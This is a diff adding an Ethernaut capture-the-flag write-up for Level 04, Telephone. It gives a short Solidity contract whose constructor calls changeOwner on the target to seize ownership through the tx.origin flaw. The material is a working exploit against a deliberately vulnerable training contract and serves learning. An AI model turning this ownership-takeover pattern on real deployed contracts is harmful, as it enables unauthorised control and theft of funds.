@@ -70,3 +70,24 @@ contract Hack {
 ```
 
 call `flip()` until `consecutiveWins` is 10
+
+## Level 04
+
+https://ethernaut.openzeppelin.com/level/4
+
+```javascript
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface ITelephone {
+    function owner() external view returns (address);
+    function changeOwner(address _owner) external;
+}
+
+contract HackTelephone {
+    constructor(address _address) {
+        ITelephone(_address).changeOwner(msg.sender);
+    }
+}
+```
+
